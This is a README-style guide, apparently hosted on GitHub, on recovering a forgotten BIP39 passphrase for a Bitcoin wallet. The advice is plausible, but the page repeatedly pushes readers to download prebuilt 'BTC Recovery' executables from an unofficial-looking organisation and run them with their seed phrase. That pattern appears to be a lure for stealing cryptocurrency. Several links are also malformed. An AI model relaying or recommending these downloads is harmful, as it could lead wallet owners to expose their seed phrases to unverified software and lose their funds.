<div align="center">
<img src="assets/banner-article.png" alt="BIP39 passphrase (25th word) recovery">
</div>

# BIP39 passphrase (25th word) recovery

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A BIP39 passphrase is an optional extra string mixed into key derivation alongside the phrase; it is not a wallet password and it is not stored anywhere. A forgotten one can be searched, because a passphrase candidate is testable against an address you already know belongs to the hidden wallet.

## You'll see this if

The phrase is right, the wallet is right, and the balance is still not there  -  because a passphrase was set once and never written down. It is the quietest cause of a "correct phrase, empty wallet" outcome.

| What you see | What it suggests | Where it goes |
|---|---|---|
| Phrase restores a working wallet with no balance | a passphrase may have been set | here |
| The device or app asks for a passphrase on every unlock | one exists, and something about it is remembered | here |
| Phrase works without a passphrase but shows a different address | the no-passphrase branch is real, just not the funded one | here |
| The passphrase is known but the wallet still looks empty | derivation path, not passphrase | [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) |
| A private key is involved rather than a phrase | different artifact and different recovery | [A private key is not a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/private-key-vs-seed-phrase-btcrecover.md) |

## Why it happens

A BIP39 passphrase is combined with the phrase before key derivation, so the same twenty-four words with a different passphrase produce an entirely different wallet. There is no checksum for the passphrase and no record of it in the wallet: an app that was given one cannot tell you what it was, only ask for it again.

This is a security feature with a sharp edge. Someone who finds the written phrase but not the passphrase gets a valid, empty wallet  -  which is precisely the point of the feature, and precisely why forgetting the passphrase feels like losing the wallet. The coins are not gone; they are behind a second input that was never written down.

The mechanism also gives you the way back. Because every candidate passphrase produces a candidate wallet, and because you know an address from the funded one, a search is possible: generate passphrases, derive, compare. It fails only when the passphrase was long, random and unremembered  -  in which case there is genuinely nothing to search from.

## Fix

Confirm the passphrase exists, get an address from the hidden wallet, then search candidates against that address rather than against a balance display.

1. **Confirm the phrase is right first.** Restore it without any passphrase, in the correct wallet type, and compare addresses. If the no-passphrase branch already matches your record, there is no passphrase to find.
2. **Find an address that belongs to the hidden wallet.** A receive address from the passphrase-protected account, from a record, an exchange withdrawal or a screenshot. This is the one thing that makes the search checkable: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md).
3. **Write down every candidate you can remember**  -  a sentence, a name, a number, a phrase with punctuation, whether it had capitals, whether it was typed once and never again.
4. **Record the wallet type and the account** the hidden wallet sat in. Passphrase and derivation path multiply together, so both need pinning: [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md).
5. **Download the current release from the GitHub releases page** and run the search offline with the passphrase as the unknown and your address as the target: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
6. **Start with exact-case candidates, then case variants.** A passphrase is a string, not a password: a capital letter or a trailing space genuinely changes the wallet, so both have to be tested, and in that order because it is cheaper.
7. **Confirm in a clean wallet.** Restore phrase plus found passphrase into a fresh install, check the address, then move the balance somewhere with the passphrase recorded properly.

A note on what the address has to be: any address from the funded branch will do, and a receive address from its first transaction is best. An address from a different account or a different address type fails against a correct passphrase, which is the most common reason a good search looks broken.

## If that did not work

If the search finishes without a match, either the passphrase is outside the candidate set or the address belongs to a different branch.

Widen in the direction that costs least: punctuation and spacing before new words, case before length, one remembered phrase before many. If the passphrase may have been typed on a different keyboard layout, or may contain a character that is ambiguous on paper  -  a one and an ell, a zero and an O  -  test those variants explicitly rather than hoping a general rule covers them.

If nothing matches and the passphrase was long and arbitrary, the honest position is that the search has no basis: there is nothing to enumerate from, and no service can supply it. That is different from a wallet whose phrase is missing words, where a bounded search exists. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) separates those cases before more time is spent.

## Prevention

- Write the passphrase down, separately from the phrase, and store both in different places.
- Record that a passphrase exists even if you decide not to record its value  -  the flag alone saves hours.
- Test the full combination  -  phrase plus passphrase  -  with a restore before funding the wallet.
- Keep the wallet type and account with the backup; the passphrase alone does not identify a branch.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### What is a BIP39 passphrase?

An optional string mixed into key derivation alongside the seed words, sometimes called the 25th word. It creates a separate wallet from the same phrase, and it is never stored in the wallet, so it has to be supplied every time.

### Is a passphrase the same as my password?

No. A wallet password decrypts a file on your device; a BIP39 passphrase changes which wallet the phrase produces. One protects the file, the other defines the keys, and they are recovered in completely different ways.

### What happens if you forget your passphrase?

The phrase still restores a valid wallet, just not the funded one, and the balance looks absent. If the passphrase is short or patterned, it can be searched against a known address; if it was long and random, there is nothing to enumerate from.

### How do I reset a passphrase?

There is no reset, because nothing holds a copy: no server, no hint, no recovery email. The passphrase is either remembered, found by searching candidates against an address, or lost along with the branch it protects.

### I have my private key but lost the passphrase. Does that help?

Yes, in the sense that a private key does not need the passphrase at all  -  it is the key itself, not an input to deriving it. If the key you hold is the one that controls the coins, the missing passphrase is irrelevant: [A private key is not a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/private-key-vs-seed-phrase-btcrecover.md).

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a Bitcoin wallet with a seed phrase]([How to recover a Bitcoin wallet with a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/recover-bitcoin-wallet-with-seed-phrase-btcrecover.md))
- [Restored seed shows an empty wallet]([Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md))
- [How to find a lost Bitcoin wallet address]([How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md))
- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
